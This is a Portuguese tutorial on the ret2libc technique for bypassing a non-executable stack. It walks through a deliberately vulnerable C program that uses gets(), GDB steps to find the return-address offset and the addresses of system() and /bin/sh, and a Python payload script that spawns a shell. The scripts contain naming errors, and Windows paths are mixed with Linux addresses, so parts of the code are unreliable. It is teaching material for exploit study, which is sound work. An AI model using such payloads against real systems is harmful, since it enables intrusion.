# WTF is ret2libc?
*Após um certo tempo exploração stack-based overflow tradicional, a curiosidade em desbravar novas possibilidades sempre surge. Caso nunca dantes tenha tido quaisquer questionamentos, deixe-me que lhe apresente uma questão:*
*Como bem sabe-se, a exploração tradicional consiste em executarmos um shellcode que empilhamos na stack. Certo, mas, e se a pilha não for executável? Desta forma, de nada nos seria útil retornar o shellcode, pois o mesmo nunca seria executado. O nome deste bloqueio é [NX bit(Non eXecute)](http://en.wikipedia.org/wiki/NX_bit), E neste pequeno tutorial, o objetivo é exemplificar como podemos dar um certo bypass e ter uma execução de código arbitrário.*
*Então, recomendo que pegue pipoca, algo para beber e se sente, pois temos um caminho deveras cansativo de explicação e exemplificação.*
## Let's Start

**ret2libc** (return to libc ( ou Arc injection ) )é um dos métodos de passarmos por esta proteção. Não muito distante de outras explorações stack-based, esta tecnica também consiste em redirecionarmos o fluxo de execução, porém, para onde?

### First of all, wtf is libc?
 *O termo "libc" é comumente usado como um atalho para o "biblioteca padrão C ", uma biblioteca de funções padrão que pode ser usada por todos programas C (e às vezes por programas em outras línguas). Por ser uma biblioteca de rotinas, contém operações comuns como [I/O data](https://pt.wikipedia.org/wiki/Entrada/sa%C3%ADda) e [Cadeia de caracteres](https://pt.wikipedia.org/wiki/Cadeia_de_caracteres).*
## So finally, for God's sake, what's the use of ret2libc?

*Antes que toda paciência seja esgotada, imagine o seguinte: A libc, por ser de uso comum, possui diversas funções. E, claro, é improvável que todas essas funções sejam inúteis à exploração de binários. A função comumente usada no **ret2libc** é a função **system( )** (acho que as coisas ficam interessantes daqui).*
*A titulo de curiosidade, usarei o python para exemplificar o uso de uma biblioteca com função **system( )***

    #usr/bin/env python
    import os
    
    os.system('ping 8.8.8.8')
    print('\n')
    print("omg, we did it")

-----
    C:\Users\ecarlosn\Desktop>python example.py
    
    Disparando 8.8.8.8 com 32 bytes de dados:
    Resposta de 8.8.8.8: bytes=32 tempo=104ms TTL=44
    Resposta de 8.8.8.8: bytes=32 tempo=144ms TTL=44
    Resposta de 8.8.8.8: bytes=32 tempo=104ms TTL=44
    Resposta de 8.8.8.8: bytes=32 tempo=103ms TTL=44
    
    Estatísticas do Ping para 8.8.8.8:
        Pacotes: Enviados = 4, Recebidos = 4, Perdidos = 0 (0% de
                 perda),
    Aproximar um número redondo de vezes em milissegundos:
        Mínimo = 103ms, Máximo = 144ms, Média = 113ms
    
    
    omg, we did it
*Acho que já ficou claro onde pretendemos chegar. No ret2libc ( Ao menos no mais simples/comum ),  A ideia é substituir o endereço de retorno para a libc, geralmente para esta função '**system()**' ( que só precisa de um argumento ) para executar um comando arbitrário. No nosso caso, vamos explorar o spawn de um **/bin/sh** através desta função.*
## Oright, let's do it
*No nosso exemplo, o código a ser utilizado será escrito em C.*

    #include <stdlib.h>
    #include <unistd.h>
    #include <stdio.h>
    #include <string.h>
    
    void getpath()
    {
      char buffer[64];
      unsigned int ret;
    
      printf("input path please: "); fflush(stdout);
    
      gets(buffer);
    
      ret = __builtin_return_address(0);
    
      if((ret & 0xbf000000) == 0xbf000000) {
          printf("bzzzt (%p)\n", ret);
          _exit(1);
      }
    
      printf("got path %s\n", buffer);
    }
    
    int main(int argc, char **argv)
    {
    
      getpath();
    
    }

---
````
gcc filename.c -o outputname -fno-stack-protector
````
* -fno-stack-protector serve para desabilitarmos o **SSP** ( smash-the-stack-protection ), outro método de proteção que não nos é útil neste caso.*
---
*também vamos utilizar o [python](https://www.python.org/downloads/) para não nos aprofundarmos muito no [GDB](https://www.gnu.org/software/gdb/), debugger utilizado para nossa depuração.*

    #!/usr/bin/env python
    import os
    import struct
    
    def main():
        padding = #valor inteiro qualquer
        payload = "A" * padding
        MeuPayload = open("payload.txt", "w")
        MeuPayload.write(payload)
        MeuPayload.close()
        os.system("cat payload.txt | NomeDoArquivoCCompilado")
    main()

*para leitura e entendimento do código python, recomendo dar uma lida na [Struct python lib](https://docs.python.org/3/library/struct.html).*
### explaining the C code
* Nas Linhas **8** e **9** Vemos duas variáveis definidas: A primeira se chama "**buffer**", um array que recebe um tamanho máximo de **64 bytes**, e a segunda é uma inteira chamada **" ret "**.
* Na linha **11,** o programa solicita a entrada do usuário e, na linha 13, essa entrada é passada para a variável buffer. E sim, não há verificação alguma se nossa entrada possui, de fato, no máximo 64 bytes. Mas, não vamos contar à gestão o que o estagiário anda fazendo, vai ser o nosso segredo.
* Na linha **15** podemos ver a variável **ret** , e um valor meio estranho, chamado **__builtin_return_address (0)**. Isto simplesmente é uma referencia ao registrador **EIP**.  Beleza, eu sei que o estagiário está passando dos limites armazenando isto em uma variável, mas, dê uma chance de ele provar o seu valor.
* E na linha 17, surge o nosso "probleminha". Uma estrutura condicional um tanto curiosa: Ela está usando uma operação [Bitwise](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Bitwise_Operators) para verificar se o endereço armazenado no **EIP** começa com o byte "**0xbf**". Se o endereço começar com este byte, o programa para a execução.

*Ok, acho que o estagiário provou seu valor. essa estrutura condicional nos diz que não podemos sobrescrever **EIP** com nenhum endereço que comece com "**0xbf**". E, isso é um problemão, porque neste caso, todo e qualquer shellcode que poderíamos usar para sobrescrever, estaria na nossa Stack, e iniciaria com **0xbf**. Mas, não priemos cânico, vamos primeiramente nos preocupar com sobrescrever o **EIP** com qualquer coisa.*
## The gdb wolrd

    gdb ./nomeDoArquivo
*Sua saída deve ser parecida com esta:*![screenshotgdb](https://i.imgur.com/GH0kA7N.png)
*Agora, vamos definir alguns breakpoints para facilitar a depuração. A linha 22, por exemplo, é uma ótima opção, pois neste estágio do programa, nossos parâmetros já foram recebidos e processados, porém ainda não foi imprimido. para definirmos o breakpoint na linha 22, precisamos de um código absurdamente complexo, como pode ser visto abaixo:*
`(gdb) break 22
`
`Breakpoint 1 at 0x401060: file /home/ruben/mingw-w64/src/mingw-w64/mingw-w64-crt/crt/crtexe.c, line 22.`
`(gdb)`

*Difícil, não?Bem, vamos continuar. Para enviarmos nosso arquivo **payload.txt** criado pelo arquivo **.py**, usamos o romando:*

`run < payload.txt`
*Ou, caso queira fazer manualmente para adiantar, pode usar o python:*
`r <<< $(python -c 'print "A"*4')`
*A saída:*

    (gdb) run < payload.txt
    Starting program: C:\Users\ecarlosn\Desktop\ret2libc\ret2libc.exe < payload.txt
    [New Thread 5896.0x1284]
    
    Breakpoint 1, pre_c_init () at /home/ruben/mingw-w64/src/mingw-w64/mingw-w64-crt/crt/crtexe.c:108
    108     /home/ruben/mingw-w64/src/mingw-w64/mingw-w64-crt/crt/crtexe.c: No such file or directory.

*Certo, agora que atingimos nosso breakpoint, podemos parar e analizar a memória. Mais específicamente a **stack frame** que é onde nosso payload vai estar, bem como o **EIP***
`(gdb) x / 32x $ esp`
![gdsc](https://i.imgur.com/nZdulIl.png)
*Boom! aí estão nossos **A's**. E o melhor, estão exatamente onde nós o colocamos na stack-frame. Nossos **A's** começam no endereço **0xbffff77c** e vão até **0xbffff77f**. Ótimo, agora que ja temos esta informação, basta procuramos o **EIP** para descobrirmos o tamanho do nosso payload.*

`(gdb) info frame`

![gdbeip](https://i.imgur.com/FmPRmXG.png)

*Sucesso! agora sabemos que o **EIP** está no endereço de memória **0xbffff7cc** (destacado em vermelho) e contém o endereço **0x08048505** (realçado em verde). E, olha só, não está tão distante do nosso endereço inicial. Podemos checar a distancia entre eles com o seguinte comando:*
`p 0xbffff7cc - 0xbffff77c`

`(gdb) p 0xbffff7cc - 0xbffff77c`

`$1 = 80`

`(gdb)`

*80.  E caso você se pergunte: "Qual a utilidade deste 80?", esta é a quantidade de **A's** para nosso overflow até **EIP**. Mas, atenção: isto não fará com que **EIP** seja sobrescrito, porém, estará à 1 byte de o fazer.*
*Vamos modificar nosso script python para o que encontramos.*

    #!/usr/bin/env python
    import os
    import struct
    
    def main():
        padding = 80
        payload = "A" * padding
        MeuPayload = open("payload.txt", "w")
        MeuPayload.write(payload)
        MeuPayload.close()
        os.system("cat payload.txt | NomeDoArquivoCCompilado")
    
    main()

*após a execução:*

    C:\Users\ecarlosn\Desktop\ret2libc                                                           
    > python example.py                                                                          
    input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Segmentation Fault 
*Ok, nada de muito diferente, porém, conseguimos uma falha de segmentação.*

## Starting with system()
*Para encontramos o endereço da função system, reiniciamos nossa aplicação, redefinimos o breakpoint, digitamos qualquer coisa no input, ex("AAAA") e quando atingirmos o break, utilizamos o comando:*
`(gdb) p system`
*Este comando nos retornará, não só informações básicas da função **system**, como seu endereço.*
![infosys](https://i.imgur.com/jhUSEUr.png)
*Sensacional, não? Bem, vamos modifica rnosso script novamente:*

    #!/usr/bin/env python
    import os
    import struct
    
    def main():
        endereco_system = struct.pack("I", 0xb7ecffb0)
        padding = 80
        Meuload = "A" * padding + endereço_system + "LMAO"
        MeuPayload = open("payload.txt", "w")
        MeuPayload.write(payload)
        thePayload.close()
        os.system("cat payload.txt | NomeArquivoCComplilado")
    
    main()
*Fizemos duas modificações: Uma delas foi adicionar o endereço de system ao nosso script, e a segunda pode lhe parecer estranha, mas eu já explico.*

*Por padrão, nosso payload deve seguir uma forma de construção:*
**[QuantBytesPraEIP] | [EndereçoFuncaoSystem] | [4 Bytes Quaisquer] | [Endereço de /bin/sh]*. Isso ocorre por conta da [Função próloga](https://en.wikipedia.org/wiki/Function_prologue), basicamente uma preparação que informa qual a stack frame a função irá utilizar. O primeiro argumento para a função do sistema ocorre quatro bytes após a chamada inicial para a função. A princípio, não nos interessa o porquê, apenas tomemos como verdade e sigamos em frente!*
## /bin/sh, where r u?
*Para encontramos este bendito endereço de bin/sh, existe mais de uma forma. em exemplos na web afora, pode-se encontrar coisas do tipo:*
*   `x/s *(environ++) `
*   *filtros através da propria shell*
*   ...

*Procurar pelo environ é interessante. Nativamente, a variável environ possui um endereço de memória, e neste endereço, existe outro endereço de memória, o qual possui as variáveis ambiente. o ++ representa um contador, que vai de 1 ao limite de variáveis ambiente. No caso, seria necessário ir somando +1 e +1 até encontrarmos o endereço de /bin/sh. Todavia, este método é um pouco inviável, pois a variável ambiente muda seu endereço de dentro do GDB para fora. Então, o que fazer?*
*Então, Vamos escrever outro código C, prometo que também será simples de se entender.*

    #include <stdio.h>
    #include <stdlib.h>
    
    int main(int argc, char *argv[])
    {
        char *endereco= getenv("SHELL");
        printf("sh ta em %p\n",endereco);
    }
`gcc -o OutputName ProgramName`

`chmod +x OutputName`

`./OutputName`
*Nossa Saída:*
`> ./vem_sh`
`sh esta em 00000000 0xbffff9de`

*Sucesso total! Temos tudo que precisamos para montar nosso script. Vamos, então, modifica-lo pela última vez!*

    #!/usr/bin/env python
    import os
    import struct
    
    def main():
        endereco_system = struct.pack("I", 0xb7ecffb0)
        endereco_sh = struct.pack("I", 0xbffff9de)
        padding = 80
        payload = "A" * padding + endereço_system + "LMAO" + endereco_sh
        MeuPayload = open("payload.txt", "w")
        MeuPayload.write(payload)
        MeuPayload.close()
        os.system("(cat payload.txt; cat) | NomeArquivoCCompilado")
    
    main()

![gotit](https://i.imgur.com/4s2HuZD.png)
*BOOOOM! sucess.*
## Recomendações e referências
### recomendações para melhor entendimento:
* [System manual](http://man7.org/linux/man-pages/man3/system.3.html)
* [Libc manual](http://man7.org/linux/man-pages/man7/libc.7.html)
* [The Stack Frame!](http://www.cs.uwm.edu/classes/cs315/Bacon/Lecture/HTML/ch10s07.html)

---
### Referências
* [ret2libc with a Buffer Overflow BY Live Overflow](https://www.youtube.com/watch?v=m17mV24TgwY)
* [Defeating a non-executable stack pdf](https://www.shellblade.net/docs/ret2libc.pdf)
---
-- *"**Vamo ownar o mundo, porquê alcançar a paz tá difícil.**"*
Luther King, MARTIN 1940
